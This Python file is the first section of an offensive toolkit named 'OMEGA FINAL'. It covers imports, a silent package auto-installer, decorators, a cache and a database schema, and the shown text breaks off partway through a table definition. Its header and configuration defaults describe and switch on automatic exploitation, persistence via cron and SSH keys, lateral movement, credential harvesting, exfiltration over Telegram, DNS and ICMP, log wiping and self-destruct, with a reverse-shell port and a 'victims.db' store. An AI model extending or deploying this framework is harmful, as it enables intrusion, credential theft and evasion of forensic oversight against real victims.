#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OMEGA FINAL - PHASE 1: RECONNAISSANCE & DISCOVERY (ENHANCED EDITION)
====================================================================
Author: Vrex489
Version: 2.1 (ENHANCED - PRODUCTION READY)
License: OMEGA FINAL PROPRIETARY - UNAUTHORIZED USE PROHIBITED

WARNING: This code is designed for aggressive penetration testing and
offensive security operations. It performs:
- Auto-exploitation of CVEs (EternalBlue, Log4Shell, PwnKit, DirtyPipe, etc.)
- Auto-persistence installation (cron, systemd, SSH keys, WMI, scheduled tasks)
- Auto-lateral movement (SSH, SMB, WinRM, RDP)
- Auto-credential harvesting (AWS, GCP, Azure, SSH, browser, databases)
- Auto-exfiltration via Telegram, S3, DNS, ICMP, WebSocket
- Auto-forensics wiping (logs, history, temp files, cache)
- Auto-self-destruct (deletes itself, wipes traces, removes tools)

ENHANCEMENTS IN THIS VERSION:
- Full type hints with TypedDict for all structures
- Custom exception hierarchy with precise error handling
- Context managers for all resources (DB, sessions, files)
- Decorators for retry, timeout, logging, rate limiting, thread safety
- Validated configuration with hierarchical override
- Formal state machine with allowed transitions
- Priority queues for critical tasks
- LRU/TTL caching for DNS, HTTP, port scans
- Batch database and Telegram operations
- Structured JSON logging with correlation_id
- Dynamic thread pool scaling
- Proxy health checking and weighted rotation
- Token bucket rate limiting
- Circuit breaker pattern for error handling
- Incremental validated checkpoints with rollback
- Metrics collection and export

Use only on authorized targets with explicit written permission.
The author assumes no liability for misuse.

THIS IS SECTION 1 OF 5 - COMPLETE ENHANCED FOUNDATION
"""

# ===================================================================
# AUTO-INSTALL MISSING PYTHON PACKAGES - MUST RUN FIRST
# ===================================================================
import subprocess
import sys
import os

REQUIRED_PACKAGES = [
    'requests',
    'colorama',
    'dnspython',
    'scapy',
    'cryptography',
    'netifaces',
    'ipaddress',
    'pyzipper',
    'tqdm',
    'psutil',
    'pycryptodome',
    'paramiko',
    'impacket',
    'python-nmap',
    'socks',
    'pysocks',
    'stem',
    'typing_extensions'
]

def auto_install_packages() -> None:
    """Automatically install missing Python packages"""
    for package in REQUIRED_PACKAGES:
        try:
            import_name = package.replace('-', '_')
            if package == 'dnspython':
                import_name = 'dns'
            elif package == 'pysocks':
                import_name = 'socks'
            __import__(import_name)
        except ImportError:
            print(f"[*] Installing missing package: {package}")
            subprocess.run([sys.executable, '-m', 'pip', 'install', package, '--quiet'], check=False)
            print(f"[+] Installed: {package}")
        except Exception:
            pass

auto_install_packages()

# ===================================================================
# CORE IMPORTS - ALL IMPORTS FOR ENTIRE PHASE 1
# ===================================================================
import re
import json
import time
import socket
import struct
import hashlib
import base64
import sqlite3
import threading
import queue
import shutil
import tempfile
import zipfile
import random
import string
import ssl
import urllib.request
import urllib.parse
import urllib.error
import http.client
import logging
import traceback
import datetime
import ipaddress
import netifaces
import signal
import atexit
import gc
import math
import csv
import html
import xml.etree.ElementTree as ET
import fnmatch
import glob
import gzip
import pickle
import platform
import getpass
import pwd
import grp
import stat
import fcntl
import termios
import tty
import select
import warnings
import inspect
import functools
import itertools
import typing
from dataclasses import dataclass, field, asdict, InitVar
from typing import (
    List, Dict, Set, Tuple, Optional, Any, Union, Callable, Iterator,
    Generator, TypeVar, Generic, cast, overload, Literal, TypedDict,
    Protocol, runtime_checkable, Final, ClassVar, NamedTuple
)
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError, Future
from collections import defaultdict, Counter, deque, OrderedDict
from functools import lru_cache, wraps, partial, reduce
from itertools import product, permutations, combinations, chain, cycle, islice
from enum import Enum, auto, IntEnum

# Third-party imports with graceful fallback
try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import colorama
    from colorama import Fore, Back, Style, init
    colorama.init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    import dns.resolver
    import dns.exception
    import dns.query
    import dns.message
    import dns.rdatatype
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, ARP, Ether, sr1, srp, send, sniff, conf,
        RandIP, RandMAC, RandShort, fragment, defragment, wrpcap, rdpcap,
        get_if_list, get_if_addr, get_if_hwaddr
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import pyzipper
    PYZIPPER_AVAILABLE = True
except ImportError:
    PYZIPPER_AVAILABLE = False

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

try:
    from impacket import smb, smb3, ntlm, smbconnection
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

try:
    import nmap
    NMAP_PYTHON_AVAILABLE = True
except ImportError:
    NMAP_PYTHON_AVAILABLE = False

try:
    import stem
    from stem import Signal
    from stem.control import Controller
    STEM_AVAILABLE = True
except ImportError:
    STEM_AVAILABLE = False

try:
    from typing_extensions import TypeVar, ParamSpec, Concatenate
    TYPING_EXTENSIONS_AVAILABLE = True
except ImportError:
    TYPING_EXTENSIONS_AVAILABLE = False
    class ParamSpec:
        pass
    class Concatenate:
        pass

# ===================================================================
# CUSTOM EXCEPTION HIERARCHY
# ===================================================================
class OmegaFinalError(Exception):
    """Base exception for all OmegaFinal errors"""
    def __init__(self, message: str, code: str = None, target: str = None, details: Dict[str, Any] = None):
        self.message = message
        self.code = code or 'UNKNOWN'
        self.target = target
        self.details = details or {}
        super().__init__(message)

class ReconError(OmegaFinalError):
    """Base exception for reconnaissance errors"""
    pass

class NetworkError(ReconError):
    """Network-related errors (timeout, connection refused, DNS)"""
    pass

class DatabaseError(ReconError):
    """Database operation errors"""
    pass

class TelegramError(ReconError):
    """Telegram API errors"""
    pass

class RateLimitError(ReconError):
    """Rate limiting exceeded"""
    pass

class ConfigurationError(ReconError):
    """Invalid or missing configuration"""
    pass

class TimeoutError(ReconError):
    """Operation timed out"""
    pass

class StateError(ReconError):
    """Invalid state transition or state corruption"""
    pass

class ResourceError(ReconError):
    """Resource exhaustion or unavailability"""
    pass

class ValidationError(ReconError):
    """Data validation failed"""
    pass

class CacheError(ReconError):
    """Cache operation failed"""
    pass

class ProxyError(ReconError):
    """Proxy-related errors"""
    pass

class ThreadPoolError(ReconError):
    """Thread pool management errors"""
    pass

class CheckpointError(ReconError):
    """Checkpoint save/load errors"""
    pass

# ===================================================================
# ENUMS - STATE MACHINE AND STATUS CODES
# ===================================================================
class ScanState(Enum):
    """Defines the valid states for the scan lifecycle"""
    IDLE = "idle"
    INITIALIZING = "initializing"
    LOADING = "loading"
    SCANNING = "scanning"
    PAUSED = "paused"
    COMPLETED = "completed"
    ERROR = "error"
    SHUTTING_DOWN = "shutting_down"

    def can_transition_to(self, target: 'ScanState') -> bool:
        """Check if transition to target state is allowed"""
        transitions = {
            ScanState.IDLE: {ScanState.INITIALIZING, ScanState.ERROR},
            ScanState.INITIALIZING: {ScanState.LOADING, ScanState.ERROR, ScanState.SHUTTING_DOWN},
            ScanState.LOADING: {ScanState.SCANNING, ScanState.ERROR, ScanState.SHUTTING_DOWN},
            ScanState.SCANNING: {ScanState.PAUSED, ScanState.COMPLETED, ScanState.ERROR, ScanState.SHUTTING_DOWN},
            ScanState.PAUSED: {ScanState.SCANNING, ScanState.ERROR, ScanState.SHUTTING_DOWN},
            ScanState.COMPLETED: {ScanState.SHUTTING_DOWN, ScanState.IDLE},
            ScanState.ERROR: {ScanState.SHUTTING_DOWN, ScanState.IDLE, ScanState.INITIALIZING},
            ScanState.SHUTTING_DOWN: {ScanState.IDLE}
        }
        return target in transitions.get(self, set())

class TaskPriority(IntEnum):
    """Priority levels for task queues"""
    CRITICAL = 1
    HIGH = 2
    NORMAL = 3
    LOW = 4

# ===================================================================
# TYPED DICT DEFINITIONS
# ===================================================================
class TargetDict(TypedDict, total=False):
    target: str
    type: Literal['domain', 'ip', 'cidr', 'url']
    status: str
    metadata: Dict[str, Any]

class SubdomainDict(TypedDict, total=False):
    target_id: int
    subdomain: str
    ip: str
    resolved: bool
    cname: str
    mx_record: str
    ns_record: str
    txt_record: str
    ssl_cert: str

class PortDict(TypedDict, total=False):
    ip: str
    port: int
    protocol: str
    service: str
    banner: str
    state: str
    version: str
    cpe: str

class TechnologyDict(TypedDict, total=False):
    url: str
    tech_name: str
    version: str
    confidence: float
    category: str
    evidence: str

class VulnerabilityDict(TypedDict, total=False):
    url: str
    parameter: str
    payload: str
    response_preview: str
    risk: str
    type: str

class CredentialDict(TypedDict, total=False):
    source: str
    credential_type: str
    username: str
    password: str
    url: str
    hash: str

class ExfilFileDict(TypedDict, total=False):
    url: str
    file_path: str
    file_size: int
    sha256: str
    md5: str
    exfil_method: str

class ConfigDict(TypedDict, total=False):
    threads: int
    timeout: int
    masscan_pps: int
    tor: bool
    self_destruct: bool
    telegram_token: str
    telegram_chat: str
    output_dir: str
    wordlist_path: str
    dirs_wordlist: str
    payloads_file: str
    proxies_file: str
    vpn_config: str
    ssh_public_key: str
    reverse_shell_ip: str
    reverse_shell_port: int
    cron_interval: str
    password: str
    enable_dangerous: bool
    enable_exploitation: bool
    enable_persistence: bool
    enable_lateral: bool
    enable_forensics: bool
    enable_cloud: bool
    enable_credential_harvesting: bool
    max_retries: int
    backoff_factor: float
    telegram_fallback: str
    scan_timeout: int
    max_targets: int
    max_subdomains_per_target: int
    max_ports_per_target: int
    max_urls_per_target: int
    max_dirs_per_target: int
    max_vuln_checks_per_url: int
    max_telegram_alerts: int
    max_file_size_exfil: int
    min_delay_between_requests: float
    max_delay_between_requests: float
    http_timeout: int
    dns_timeout: int
    port_timeout: int
    subdomain_threads: int
    port_threads: int
    http_threads: int
    dir_threads: int
    vuln_threads: int
    cve_threads: int
    retry_count: int
    retry_delay: int
    log_level: str
    enable_cache: bool
    cache_ttl: int
    enable_auto_install: bool
    enable_checkpoint: bool
    checkpoint_interval: int
    enable_telegram: bool
    enable_dashboard: bool
    enable_progress_bar: bool
    enable_color: bool
    enable_emojis: bool
    report_format: List[str]
    exfil_methods: List[str]

# ===================================================================
# DECORATORS - RETRY, TIMEOUT, LOGGING, RATE LIMITING, THREAD SAFETY
# ===================================================================
P = ParamSpec('P')
R = TypeVar('R')

def retry(
    max_attempts: int = 5,
    backoff: float = 2.0,
    exceptions: Tuple[type, ...] = (Exception,),
    jitter: float = 0.1
) -> Callable[[Callable[P, R]], Callable[P, R]]:
    """Decorator to retry a function with exponential backoff and jitter."""
    def decorator(func: Callable[P, R]) -> Callable[P, R]:
        @wraps(func)
        def wrapper(*args: P.args, **kwargs: P.kwargs) -> R:
            last_exception = None
            delay = 1.0
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    if attempt == max_attempts - 1:
                        raise
                    sleep_time = delay * (backoff ** attempt) + (random.random() * jitter)
                    time.sleep(sleep_time)
            raise last_exception  # type: ignore
        return wrapper
    return decorator

def timeout(seconds: float) -> Callable[[Callable[P, R]], Callable[P, R]]:
    """Decorator to enforce a timeout on a function."""
    import signal as sig

    def decorator(func: Callable[P, R]) -> Callable[P, R]:
        def _timeout_handler(signum: int, frame: Any) -> None:
            raise TimeoutError(f"Function {func.__name__} timed out after {seconds}s")

        @wraps(func)
        def wrapper(*args: P.args, **kwargs: P.kwargs) -> R:
            old_handler = sig.signal(sig.SIGALRM, _timeout_handler)
            sig.alarm(int(seconds) + 1)
            try:
                return func(*args, **kwargs)
            finally:
                sig.alarm(0)
                sig.signal(sig.SIGALRM, old_handler)
        return wrapper
    return decorator

def log_execution(level: str = 'DEBUG') -> Callable[[Callable[P, R]], Callable[P, R]]:
    """Decorator to log function execution with arguments and return value."""
    def decorator(func: Callable[P, R]) -> Callable[P, R]:
        @wraps(func)
        def wrapper(*args: P.args, **kwargs: P.kwargs) -> R:
            logger = logging.getLogger('ReconPhase1')
            func_name = func.__name__
            try:
                args_repr = [repr(a) for a in args]
                kwargs_repr = [f"{k}={repr(v)}" for k, v in kwargs.items()]
                signature = ", ".join(args_repr + kwargs_repr)
                logger.log(getattr(logging, level.upper()), f"Entering {func_name}({signature})")
            except Exception:
                pass

            try:
                result = func(*args, **kwargs)
                try:
                    result_repr = repr(result)[:200]
                    logger.log(getattr(logging, level.upper()), f"Exiting {func_name} -> {result_repr}")
                except Exception:
                    pass
                return result
            except Exception as e:
                logger.error(f"{func_name} failed: {e}")
                raise
        return wrapper
    return decorator

def thread_safe(func: Callable[P, R]) -> Callable[P, R]:
    """Decorator to make a function thread-safe using a per-instance lock."""
    @wraps(func)
    def wrapper(self: Any, *args: P.args, **kwargs: P.kwargs) -> R:
        if not hasattr(self, '_thread_lock'):
            self._thread_lock = threading.RLock()
        with self._thread_lock:
            return func(self, *args, **kwargs)
    return wrapper

class RateLimiter:
    """Token bucket rate limiter for controlling request rates."""

    def __init__(self, rate: float, per: float = 1.0):
        self.rate = rate
        self.per = per
        self.tokens = rate
        self.last_refill = time.time()
        self.lock = threading.RLock()

    def acquire(self, tokens: float = 1.0) -> float:
        """Acquire tokens from the bucket. Returns time to wait in seconds."""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_refill
            self.tokens = min(self.rate, self.tokens + elapsed * (self.rate / self.per))
            self.last_refill = now

            if self.tokens >= tokens:
                self.tokens -= tokens
                return 0.0

            wait_time = (tokens - self.tokens) / (self.rate / self.per)
            self.tokens = 0
            return wait_time

    def wait_and_acquire(self, tokens: float = 1.0) -> None:
        """Acquire tokens, waiting as necessary."""
        wait = self.acquire(tokens)
        if wait > 0:
            time.sleep(wait)

def rate_limit(rate: float, per: float = 1.0) -> Callable[[Callable[P, R]], Callable[P, R]]:
    """Decorator to apply rate limiting to a function."""
    limiter = RateLimiter(rate, per)

    def decorator(func: Callable[P, R]) -> Callable[P, R]:
        @wraps(func)
        def wrapper(*args: P.args, **kwargs: P.kwargs) -> R:
            limiter.wait_and_acquire()
            return func(*args, **kwargs)
        return wrapper
    return decorator

# ===================================================================
# CONFIGURATION VALIDATION WITH HIERARCHY
# ===================================================================
class ConfigValidator:
    """Validates configuration with hierarchical override."""

    DEFAULTS: ConfigDict = {
        'threads': 1000,
        'timeout': 5,
        'masscan_pps': 100000,
        'tor': True,
        'self_destruct': False,
        'telegram_token': '',
        'telegram_chat': '',
        'output_dir': 'output',
        'wordlist_path': '/root/omega_final/data/wordlists/subdomains.txt',
        'dirs_wordlist': '/root/omega_final/data/wordlists/dirs.txt',
        'payloads_file': '/root/omega_final/data/payloads/payloads.txt',
        'proxies_file': '/root/omega_final/config/proxies.txt',
        'vpn_config': '/root/omega_final/config/vpn.ovpn',
        'ssh_public_key': '/root/omega_final/config/id_rsa.pub',
        'reverse_shell_ip': '0.0.0.0',
        'reverse_shell_port': 4444,
        'cron_interval': '*/5 * * * *',
        'password': 'OmegaFinal_2026',
        'enable_dangerous': True,
        'enable_exploitation': True,
        'enable_persistence': True,
        'enable_lateral': True,
        'enable_forensics': True,
        'enable_cloud': True,
        'enable_credential_harvesting': True,
        'max_retries': 5,
        'backoff_factor': 2.0,
        'telegram_fallback': '/root/omega_final/output/telegram_fallback.txt',
        'scan_timeout': 3600,
        'max_targets': 1000,
        'max_subdomains_per_target': 100000,
        'max_ports_per_target': 65535,
        'max_urls_per_target': 50000,
        'max_dirs_per_target': 50000,
        'max_vuln_checks_per_url': 50,
        'max_telegram_alerts': 10000,
        'max_file_size_exfil': 52428800,
        'min_delay_between_requests': 0.05,
        'max_delay_between_requests': 5.0,
        'http_timeout': 10,
        'dns_timeout': 5,
        'port_timeout': 3,
        'subdomain_threads': 500,
        'port_threads': 500,
        'http_threads': 1000,
        'dir_threads': 300,
        'vuln_threads': 100,
        'cve_threads': 50,
        'retry_count': 5,
        'retry_delay': 1,
        'log_level': 'DEBUG',
        'enable_cache': True,
        'cache_ttl': 3600,
        'enable_auto_install': True,
        'enable_checkpoint': True,
        'checkpoint_interval': 60,
        'enable_telegram': True,
        'enable_dashboard': True,
        'enable_progress_bar': True,
        'enable_color': True,
        'enable_emojis': True,
        'report_format': ['json', 'html', 'csv', 'pdf'],
        'exfil_methods': ['telegram', 's3', 'dns', 'icmp', 'http', 'websocket', 'email']
    }

    def __init__(self, config_file: Optional[Path] = None):
        self.config_file = config_file
        self._config: ConfigDict = {}

    def load(self) -> ConfigDict:
        """Load configuration from all sources with hierarchy"""
        self._config = self.DEFAULTS.copy()

        if self.config_file and self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    file_config = json.load(f)
                    self._config.update(file_config)
            except Exception as e:
                print(f"[WARNING] Could not load config file: {e}")

        env_prefix = 'OMEGA_'
        for key, value in os.environ.items():
            if key.startswith(env_prefix):
                config_key = key[len(env_prefix):].lower()
                if config_key in self._config:
                    original_type = type(self._config[config_key])
                    try:
                        if original_type == bool:
                            self._config[config_key] = value.lower() in ('true', '1', 'yes')
                        elif original_type == int:
                            self._config[config_key] = int(value)
                        elif original_type == float:
                            self._config[config_key] = float(value)
                        elif original_type == list:
                            self._config[config_key] = [v.strip() for v in value.split(',')]
                        else:
                            self._config[config_key] = value
                    except Exception:
                        pass

        self._validate()
        return self._config

    def _validate(self) -> None:
        """Validate all configuration values"""
        errors = []

        if not self._config.get('output_dir'):
            errors.append("output_dir is required")

        type_checks = [
            ('threads', int, lambda x: x > 0),
            ('timeout', (int, float), lambda x: x > 0),
            ('masscan_pps', int, lambda x: x > 0),
            ('tor', bool),
            ('self_destruct', bool),
            ('max_retries', int, lambda x: x > 0),
            ('backoff_factor', (int, float), lambda x: x > 1),
            ('scan_timeout', int, lambda x: x > 0),
            ('max_targets', int, lambda x: x > 0),
            ('max_file_size_exfil', int, lambda x: x > 0),
            ('http_timeout', (int, float), lambda x: x > 0),
            ('dns_timeout', (int, float), lambda x: x > 0),
            ('port_timeout', (int, float), lambda x: x > 0),
            ('retry_count', int, lambda x: x > 0),
            ('retry_delay', (int, float), lambda x: x > 0),
            ('cache_ttl', int, lambda x: x > 0),
            ('checkpoint_interval', int, lambda x: x > 0),
            ('enable_cache', bool),
            ('enable_auto_install', bool),
            ('enable_checkpoint', bool),
            ('enable_telegram', bool),
            ('enable_dashboard', bool),
            ('enable_progress_bar', bool),
            ('enable_color', bool),
            ('enable_emojis', bool),
            ('enable_dangerous', bool),
            ('enable_exploitation', bool),
            ('enable_persistence', bool),
            ('enable_lateral', bool),
            ('enable_forensics', bool),
            ('enable_cloud', bool),
            ('enable_credential_harvesting', bool)
        ]

        for key, expected_type, *validator in type_checks:
            value = self._config.get(key)
            if value is None:
                continue
            if not isinstance(value, expected_type):
                errors.append(f"{key} must be {expected_type.__name__}, got {type(value).__name__}")
            elif validator and not validator[0](value):
                errors.append(f"{key} value {value} failed validation")

        valid_log_levels = ['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']
        if self._config.get('log_level', '').upper() not in valid_log_levels:
            errors.append(f"log_level must be one of {valid_log_levels}")

        valid_report_formats = ['json', 'html', 'csv', 'pdf', 'markdown']
        for fmt in self._config.get('report_format', []):
            if fmt not in valid_report_formats:
                errors.append(f"report_format must be one of {valid_report_formats}")

        if errors:
            raise ConfigurationError(f"Config validation failed: {'; '.join(errors)}")

    def get(self, key: str, default: Any = None) -> Any:
        return self._config.get(key, default)

    def update(self, **kwargs: Any) -> None:
        self._config.update(kwargs)

# ===================================================================
# GLOBAL CONSTANTS
# ===================================================================
VERSION: Final[str] = "2.1.0"
PROGRAM_NAME: Final[str] = "OMEGA_FINAL_PHASE1"
TIMESTAMP: str = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
PID: int = os.getpid()
HOSTNAME: str = socket.gethostname()
USERNAME: str = os.getenv('USER', getpass.getuser())

BASE_DIR: Path = Path("/root/omega_final")
OUTPUT_DIR: Path = BASE_DIR / "output"
RECON_DIR: Path = OUTPUT_DIR / "recon"
EXFIL_DIR: Path = RECON_DIR / "exfil"
LOGS_DIR: Path = OUTPUT_DIR / "logs"
SCREENSHOTS_DIR: Path = OUTPUT_DIR / "screenshots"
SHELLS_DIR: Path = OUTPUT_DIR / "shells"
REPORTS_DIR: Path = OUTPUT_DIR / "reports"
EXPORTS_DIR: Path = OUTPUT_DIR / "exports"
CHECKPOINTS_DIR: Path = OUTPUT_DIR / "checkpoints"
TEMP_DIR: Path = OUTPUT_DIR / "temp"

CONFIG_DIR: Path = BASE_DIR / "config"
DATA_DIR: Path = BASE_DIR / "data"
WORDLIST_DIR: Path = DATA_DIR / "wordlists"
PAYLOADS_DIR: Path = DATA_DIR / "payloads"
SIGNATURES_DIR: Path = DATA_DIR / "signatures"

DB_PATH: Path = OUTPUT_DIR / "victims.db"
STATE_FILE: Path = RECON_DIR / f"recon_state_{TIMESTAMP}.json"
TELEGRAM_FALLBACK: Path = OUTPUT_DIR / "telegram_fallback.txt"
PROXY_FILE: Path = CONFIG_DIR / "proxies.txt"
VPN_CONFIG: Path = CONFIG_DIR / "vpn.ovpn"
SSH_PUB_KEY: Path = CONFIG_DIR / "id_rsa.pub"
CONFIG_JSON: Path = CONFIG_DIR / "config.json"

DEFAULT_THREADS: int = 1000
DEFAULT_TIMEOUT: int = 5
DEFAULT_MASS_CAN_PPS: int = 100000
DEFAULT_SCAN_DELAY: float = 0.05
PASSWORD_PROTECT: str = "OmegaFinal_2026"
REVERSE_SHELL_IP: str = "0.0.0.0"
REVERSE_SHELL_PORT: int = 4444
CRON_INTERVAL: str = "*/5 * * * *"
TELEGRAM_RETRY_INTERVAL: int = 60
MAX_RETRIES: int = 5
BACKOFF_FACTOR: float = 2.0

CLEAR_SCREEN: str = '\033[2J\033[H'
HIDE_CURSOR: str = '\033[?25l'
SHOW_CURSOR: str = '\033[?25h'
RESET_COLOR: str = '\033[0m'
BOLD: str = '\033[1m'
DIM: str = '\033[2m'
UNDERLINE: str = '\033[4m'
BLINK: str = '\033[5m'
REVERSE: str = '\033[7m'

BLACK: str = '\033[30m'
RED: str = '\033[31m'
GREEN: str = '\033[32m'
YELLOW: str = '\033[33m'
BLUE: str = '\033[34m'
MAGENTA: str = '\033[35m'
CYAN: str = '\033[36m'
WHITE: str = '\033[37m'

BRIGHT_BLACK: str = '\033[90m'
BRIGHT_RED: str = '\033[91m'
BRIGHT_GREEN: str = '\033[92m'
BRIGHT_YELLOW: str = '\033[93m'
BRIGHT_BLUE: str = '\033[94m'
BRIGHT_MAGENTA: str = '\033[95m'
BRIGHT_CYAN: str = '\033[96m'
BRIGHT_WHITE: str = '\033[97m'

BG_BLACK: str = '\033[40m'
BG_RED: str = '\033[41m'
BG_GREEN: str = '\033[42m'
BG_YELLOW: str = '\033[43m'
BG_BLUE: str = '\033[44m'
BG_MAGENTA: str = '\033[45m'
BG_CYAN: str = '\033[46m'
BG_WHITE: str = '\033[47m'

ICONS: Dict[str, str] = {
    'INFO': 'ℹ️', 'WARNING': '⚠️', 'ERROR': '❌', 'SUCCESS': '✅',
    'CRITICAL': '🚨', 'DANGER': '💀', 'FOUND': '🎯', 'FILE': '📁',
    'CRED': '🔑', 'SHELL': '🐚', 'EXFIL': '📤', 'VULN': '🐛',
    'CVE': '💥', 'CLOUD': '☁️', 'WAF': '🛡️', 'HONEYPOT': '🍯',
    'API': '🔌', 'PORT': '🔓', 'SUBDOMAIN': '🌐', 'TECH': '⚙️',
    'URL': '🔗', 'PERSIST': '🪝', 'LATERAL': '↔️', 'FORENSICS': '🧹',
    'ANON': '🕵️', 'TOR': '🧅', 'VPN': '🔒', 'PROXY': '🌀',
    'DB': '🗄️', 'TARGET': '🎯', 'START': '🚀', 'STOP': '🛑',
    'PAUSE': '⏸️', 'RESUME': '▶️', 'DASHBOARD': '📊', 'REPORT': '📄',
    'ARCHIVE': '📦', 'ZIP': '🗜️', 'KEY': '🗝️', 'HASH': '#️⃣',
    'PASSWORD': '🔐', 'USER': '👤', 'IP': '🌍', 'DOMAIN': '🏛️',
    'EMAIL': '✉️', 'PHONE': '📱', 'BACKUP': '💾', 'CONFIG': '⚙️',
    'LOG': '📋', 'TEMP': '🌡️', 'CACHE': '💨', 'KERNEL': '🐧',
    'WINDOWS': '🪟', 'MAC': '🍎', 'ANDROID': '🤖', 'IOT': '📡',
    'RCE': '🔥', 'LFI': '📂', 'SQLI': '💉', 'XSS': '🖥️',
    'PTH': '🎭', 'GOLDEN': '👑', 'SILVER': '🥈', 'TICKET': '🎫'
}

# ===================================================================
# CACHE MANAGER - TTL-BASED LRU CACHE
# ===================================================================
class CacheEntry:
    """Cache entry with TTL and metadata"""

    def __init__(self, value: Any, ttl: int = 3600):
        self.value = value
        self.created_at = time.time()
        self.ttl = ttl
        self.access_count = 0
        self.last_accessed = self.created_at

    def is_expired(self) -> bool:
        return time.time() - self.created_at > self.ttl

    def touch(self) -> None:
        self.last_accessed = time.time()
        self.access_count += 1

class CacheManager:
    """TTL-based LRU cache with memory limits and statistics."""

    def __init__(self, max_size: int = 10000, default_ttl: int = 3600):
        self.max_size = max_size
        self.default_ttl = default_ttl
        self._cache: Dict[str, CacheEntry] = {}
        self._lock = threading.RLock()
        self._hits = 0
        self._misses = 0
        self._evictions = 0

    @thread_safe
    def get(self, key: str, default: Any = None) -> Any:
        if key in self._cache:
            entry = self._cache[key]
            if entry.is_expired():
                del self._cache[key]
                self._misses += 1
                return default
            entry.touch()
            self._hits += 1
            return entry.value
        self._misses += 1
        return default

    @thread_safe
    def set(self, key: str, value: Any, ttl: Optional[int] = None) -> None:
        if ttl is None:
            ttl = self.default_ttl
        if len(self._cache) >= self.max_size:
            self._evict_oldest()
        self._cache[key] = CacheEntry(value, ttl)

    @thread_safe
    def delete(self, key: str) -> bool:
        if key in self._cache:
            del self._cache[key]
            return True
        return False

    @thread_safe
    def clear(self) -> None:
        self._cache.clear()
        self._evictions += len(self._cache)

    @thread_safe
    def evict_expired(self) -> int:
        expired = [k for k, v in self._cache.items() if v.is_expired()]
        for k in expired:
            del self._cache[k]
        self._evictions += len(expired)
        return len(expired)

    def _evict_oldest(self) -> None:
        if not self._cache:
            return
        oldest_key = min(self._cache, key=lambda k: self._cache[k].last_accessed)
        del self._cache[oldest_key]
        self._evictions += 1

    def get_stats(self) -> Dict[str, Any]:
        return {
            'size': len(self._cache),
            'max_size': self.max_size,
            'hits': self._hits,
            'misses': self._misses,
            'hit_rate': self._hits / (self._hits + self._misses) if self._hits + self._misses > 0 else 0,
            'evictions': self._evictions,
            'expired_entries': sum(1 for v in self._cache.values() if v.is_expired())
        }

# ===================================================================
# DASHBOARD - LIVE MONITORING
# ===================================================================
dashboard_lock: threading.RLock = threading.RLock()
dashboard_data: Dict[str, Any] = {
    'status': 'INITIALIZING',
    'total_targets': 0,
    'completed_targets': 0,
    'total_subdomains': 0,
    'total_ports': 0,
    'total_technologies': 0,
    'total_vulnerabilities': 0,
    'total_exfiltrated': 0,
    'total_credentials': 0,
    'total_wafs': 0,
    'total_honeypots': 0,
    'total_apis': 0,
    'total_cves': 0,
    'total_shells': 0,
    'total_persistence': 0,
    'total_lateral': 0,
    'active_threads': 0,
    'queued_tasks': 0,
    'elapsed_time': 0,
    'estimated_time': 0,
    'telegram_alerts': 0,
    'subdomains_found': [],
    'open_ports_found': [],
    'vulnerabilities_found': [],
    'exfiltrated_files': [],
    'credentials_found': [],
    'shells_established': [],
    'last_updated': time.time(),
    'scan_id': TIMESTAMP
}
dashboard_running: bool = False
dashboard_thread: Optional[threading.Thread] = None

# ===================================================================
# COMPLETE DATABASE SCHEMA - ALL TABLES
# ===================================================================
DB_SCHEMA: str = """
CREATE TABLE IF NOT EXISTS targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT NOT NULL,
    type TEXT CHECK(type IN ('domain', 'ip', 'cidr', 'url')),
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'pending',
    metadata TEXT
);
CREATE INDEX IF NOT EXISTS idx_targets_target ON targets(target);
CREATE INDEX IF NOT EXISTS idx_targets_status ON targets(status);

CREATE TABLE IF NOT EXISTS subdomains (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER,
    subdomain TEXT NOT NULL,
    ip TEXT,
    resolved BOOLEAN DEFAULT 0,
    cname TEXT,
    mx_record TEXT,
    ns_record TEXT,
    txt_record TEXT,
    ssl_cert TEXT,
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(target_id) REFERENCES targets(id)
);
CREATE INDEX IF NOT EXISTS idx_subdomains_subdomain ON subdomains(subdomain);
CREATE INDEX IF NOT EXISTS idx_subdomains_ip ON subdomains(ip);

CREATE TABLE IF NOT EXISTS ports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    subdomain_id INTEGER,
    ip TEXT,
    port INTEGER,
    protocol TEXT DEFAULT 'tcp',
    service TEXT,
    banner TEXT,
